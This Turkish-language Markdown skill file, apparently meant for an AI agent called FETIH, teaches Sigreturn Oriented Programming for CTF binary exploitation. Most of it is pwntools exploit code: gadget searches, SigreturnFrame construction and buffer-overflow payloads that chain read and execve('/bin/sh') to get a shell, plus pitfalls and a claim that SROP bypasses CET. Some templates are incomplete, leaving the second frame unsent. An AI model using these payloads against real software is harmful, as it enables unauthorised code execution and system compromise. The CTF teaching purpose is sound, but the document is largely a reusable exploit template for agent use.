---
name: srop-attack
description: Sigreturn Oriented Programming (SROP) — sigreturn syscall ile tüm registerları tek payload'da kontrol etme; gadget kıtlığında ROP alternatifi
tags: [ctf, pwn, srop, sigreturn, rop, syscall, register-control, pwntools, sigreturnframe]
triggers:
  - "ROP gadget yok"
  - "az gadget"
  - "static binary"
  - "small attack surface"
  - "syscall execve"
  - "SigreturnFrame"
  - "sigreturn"
  - "rt_sigreturn"
  - "syscall ret"
  - "ucontext"
  - "register control"
  - "ASLR + tek gadget"
  - "no rop gadgets"
  - "minimum binary"
difficulty: medium
category: pwn
solved_challenges:
  - "DEF CON Quals 2018 - smashthestate (SROP)"
  - "PlaidCTF 2017 - tonnerre (SROP, az gadget)"
  - "HITCON 2017 - start (SROP klasik)"
  - "TokyoWesterns CTF 2019 - asterisk_alloc"
  - "DownUnderCTF 2022 - srops"
related_skills:
  - buffer-overflow-rop
  - ret2libc
  - seccomp-sandbox-escape
  - remote-pwn
adapted_for: fetih
---

# SROP — Sigreturn Oriented Programming

ROP yerine **tek bir gadget (syscall; ret)** ile tüm register'ları kontrol et. Linux'un `sigreturn` syscall'ı, sinyal handler'dan döndüğünde tüm CPU durumunu (RAX, RBX, RCX, RDX, RDI, RSI, RBP, RSP, R8-R15, RIP, EFLAGS, CS, GS, FS) stackten okur. Stack'i kontrol edebiliyorsan tüm register'ları kontrol edersin.

---

## Ne Zaman Kullan

| Senaryo | SROP Uygun mu? |
|---|---|
| Binary statik linked, libc yok | ✅ Mükemmel |
| Çok az ROP gadget bulundu | ✅ Mükemmel |
| Stack adresi biliniyor (no ASLR / leaked) | ✅ |
| `syscall; ret` gadget'ı var | ✅ Şart |
| `rax = 15` (SYS_rt_sigreturn) set edebiliyorsun | ✅ Şart |
| Dynamic binary + libc + bol gadget | ❌ Klasik ROP daha kolay |

---

## Teknik Arka Plan

### Linux Sinyal İşleme
Sinyal geldiğinde kernel kullanıcı sürecine "sinyal frame" denen yapıyı stack'e basar:

```c
// linux/include/uapi/asm-generic/ucontext.h benzeri
struct sigcontext {
    uint64_t r8, r9, r10, r11, r12, r13, r14, r15;
    uint64_t rdi, rsi, rbp, rbx, rdx, rax, rcx, rsp, rip;
    uint64_t eflags;
    uint16_t cs, gs, fs, __pad0;
    uint64_t err, trapno, oldmask, cr2;
    void *fpstate;
    uint64_t reserved[8];
};
```

Sinyal handler'dan döndüğünde sürec `sys_rt_sigreturn` (syscall #15 on x86-64) çağırır. Bu syscall stack'in tepesinden sigcontext'i okur, **doğrulama yapmadan** registerları yükler ve `rip`'e atlar.

### Saldırı: Sahte Sigframe
1. Stack'e sahte bir sigcontext kur (registerları istediğin gibi)
2. `rax = 15` set et
3. `syscall; ret` gadget'a atla
4. Kernel sigframe'i okur, registerları yükler
5. Yeni RIP'ten yürütme devam eder

---

## Çözüm Adımları (pwntools)

### Şablon
```python
# exploit_srop.py
from pwn import *

BINARY = './vuln'
elf = context.binary = ELF(BINARY)

# 1. syscall; ret gadget bul
SYSCALL_RET = next(elf.search(asm('syscall; ret')))
log.info(f'syscall;ret = {hex(SYSCALL_RET)}')

# 2. Stack adresi (BSS, leaked stack, vb.)
BSS = elf.bss(0x100)

# 3. read syscall ile BSS'e "/bin/sh\x00" yaz
# 4. SROP ile execve("/bin/sh", 0, 0) çağır

io = process(BINARY)

# Stage 1: BSS'e "/bin/sh\x00" yaz (read syscall)
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0           # stdin
frame.rsi = BSS         # buf
frame.rdx = 8           # count
frame.rsp = BSS + 0x800 # yeni stack
frame.rip = SYSCALL_RET

offset = 40  # cyclic ile bulduğun
payload = b'A' * offset
payload += p64(SYSCALL_RET)   # rax = 15 ayarlandıktan sonra atlayacak
payload += bytes(frame)       # SigreturnFrame

# Önce rax = 15 ayarlamamız gerek — read'in dönüş değeri = okunan byte sayısı
# Bu yüzden zincir: read(0, buf, 15) → rax = 15 → ret → syscall ret (sigreturn)
# Veya doğrudan rax = 15 ayarlayan gadget bul

# Trick: read dönüşünden rax = byte count, eğer 15 byte göndertirsen rax = 15 olur
# Daha temiz: aşağıdaki zincir
io.sendline(payload)
io.send(b'/bin/sh\x00')

# Stage 2: execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rdi = BSS        # "/bin/sh"
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = SYSCALL_RET

# Bu frame'i de stage 1'in devamı olarak gönder
# (tek zincirde iki sigreturn da mümkün)

io.interactive()
```

---

## Pratik Tam Örnek — Klasik SROP Challenge

```python
# vuln binary:
#   - read(0, buf, 0x100) (BOF)
#   - main return
# Hedef: shell

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln')
io = process('./vuln')

# Sembol/adres tespit
syscall_ret  = next(elf.search(asm('syscall; ret')))
vuln_read    = elf.symbols['main']    # main'e geri dön (yeniden BOF için)
bss          = elf.bss(0x500)

log.success(f'syscall;ret @ {hex(syscall_ret)}')
log.success(f'bss        @ {hex(bss)}')

# --- Stage 1: BSS'e "/bin/sh" yaz, sonra main'e geri dön ---
# rax = 15 ayarlama tricki:
#   gadget: "pop rax; ret" varsa kullan
#   yoksa read'den rax = 15 ayarla (15 byte oku)

# Önce 15 byte input okutarak rax = 15 yap
# Sonra payload ile sigreturn frame'i tetikle

# offset = main'in stack'ine kadar olan padding
offset = 40

# Sigframe 1: BSS'e "/bin/sh" yaz
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read
frame1.rdi = 0
frame1.rsi = bss
frame1.rdx = 8
frame1.rip = syscall_ret
frame1.rsp = bss + 0x800

# Sigframe 2: execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rdi = bss
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

# Payload: 40 byte padding + syscall_ret (for rax=15) + frame1
# rax'i 15 yapmak için: önce read syscall yap, dönüşte rax = 15 olur
# Bu kısa örnek için pop rax; ret gadget olduğunu varsayıyorum:
try:
    pop_rax = next(elf.search(asm('pop rax; ret')))
    log.success(f'pop rax;ret @ {hex(pop_rax)}')

    payload  = b'A' * offset
    payload += p64(pop_rax) + p64(15)           # rax = 15 (SYS_rt_sigreturn)
    payload += p64(syscall_ret)                  # trigger sigreturn
    payload += bytes(frame1)                     # frame 1: read /bin/sh

    io.send(payload)
    io.send(b'/bin/sh\x00')

    # Bir sonraki BOF'da frame2'yi gönder
    # ... (challenge'a göre uyarla)

except StopIteration:
    log.error('pop rax;ret yok — alternatif gerek')

io.interactive()
```

---

## Klasik SROP Trick: Çift Frame

Bir BOF'ta iki sigreturn frame zincirleyebilirsin:

```python
# Frame 1: read syscall, BSS'e "/bin/sh" yaz, RIP = syscall_ret
# Frame 1'in RSP'sini öyle ayarla ki Frame 2'nin başına gelsin

payload = b'A' * offset
payload += p64(pop_rax) + p64(15)
payload += p64(syscall_ret) + bytes(frame1)
payload += p64(pop_rax) + p64(15)   # Frame 1 dönüşünden sonra
payload += p64(syscall_ret) + bytes(frame2)

# Frame 1'in rsp'si payload'ın bu bölümüne işaret etmeli
frame1.rsp = leak_stack_addr + offset_to_second_frame
```

---

## Stack Adresi Yoksa — RSP-Relative

```python
# Mevcut RSP'i leak edemiyorsan, sigframe'in rsp'sini RSP-tabanlı hesapla
# Genelde "current_rsp = leak_addr" sonra "frame.rsp = leak_addr + N"
```

---

## Gerçek CTF Örneği — DEF CON Quals 2018 smashthestate

```python
# 32 bit binary, çok az gadget
# Sadece read syscall + read'in stack'i overflow ettirebileceği yer
# Çözüm: read(0, fake_stack, 0x100) ile fake stack kurulur
# sonra sigreturn ile execve("/bin/sh", 0, 0)
# Detay: https://ctftime.org/writeup/9803
```

---

## Tuzaklar

1. **`syscall; ret` gadget yoksa** SROP imkansız. Statik binary'lerde genelde vardır (libc'nin `syscall()` wrapper'ında).
2. **`rax = 15` ayarlama:** `pop rax; ret` yoksa, read syscall ile 15 byte okutturup `rax = 15` dönüşünü kullan. Veya başka syscall'ın dönüş değerinden faydalan.
3. **Stack adresi bilinmeli:** Çoğu durumda BSS yeterli ama bazen leaked stack gerekir.
4. **CS/SS değerleri:** 64-bit'te `cs = 0x33`, `ss = 0x2b` olmalı. SigreturnFrame() default doğru ayarlar.
5. **SECCOMP filter:** `rt_sigreturn` (syscall #15) yasaklanmışsa SROP olmaz. seccomp-tools ile kontrol et.
6. **PIE binary:** `syscall; ret` adresi PIE base'e bağlı — leak gerekir.
7. **32-bit vs 64-bit:** 32-bit'te `sys_sigreturn` #119, 64-bit'te `sys_rt_sigreturn` #15. SigreturnFrame() context.arch'a göre otomatik ayarlar.

---

## Avantajları (vs ROP)

| Özellik | SROP | ROP |
|---|---|---|
| Gadget ihtiyacı | 1 (syscall;ret) | Çok |
| Payload boyutu | ~250 byte (sigframe) | Değişken |
| Register kontrolü | Tümü, tek payload | Parça parça |
| Statik binary | İdeal | Zor |
| Anti-ROP koruma (CET) | Bypass | Engellenir |

---

## Cross-Skill Pivot

```
Binary BOF var → checksec
              ├── NX + libc + bol gadget → ret2libc skill
              ├── az gadget + libc → ROP chain skill
              ├── az gadget + statik → SROP (bu skill)
              ├── SECCOMP → seccomp-sandbox-escape skill
              └── heap challenge → heap-exploit skill
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 0d537dca41f6af6a
-->

